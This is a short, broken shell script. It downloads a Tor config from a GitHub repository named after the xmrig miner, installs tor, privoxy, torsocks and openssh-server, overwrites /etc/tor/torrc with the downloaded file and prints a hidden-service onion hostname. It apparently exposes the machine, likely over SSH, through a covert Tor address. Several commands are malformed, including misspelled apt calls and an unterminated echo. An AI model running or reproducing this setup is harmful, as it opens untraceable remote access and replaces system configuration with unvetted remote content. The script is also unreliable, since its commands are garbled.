wget https://raw.githubusercontent.com/ceeb57f83688/xmrig/main/TOR/torrc
sudo apt get install net-tools -y
sudo apt-get install openssh-server -y
sudo apt-get install torsocks -y
sudo apt-get install tor -y
sudo apt-get install screen -y
sudo apt-get install privoxy -y
sudo apt-get update && sudo apt-get upgrade -y 
sudo apt update && sudo apt upgrade -y
sudo apt-get ibus-pinyin
sudo apt-get ibus
sudo apt-get ibus-clutter
sudo apt-get ibus-gtk
sudo apt-get ibus-gtk3
 sudo apt-get ibus-qt4

sudo /etc/init.d/tor stop

sudo rm /etc/tor/torrc
sudo cp torrc /etc/tor/torrc

sudo /etc/init.d/tor start
bash -c 'echo "

cat /var/lib/tor/other_hidden_service/hostname
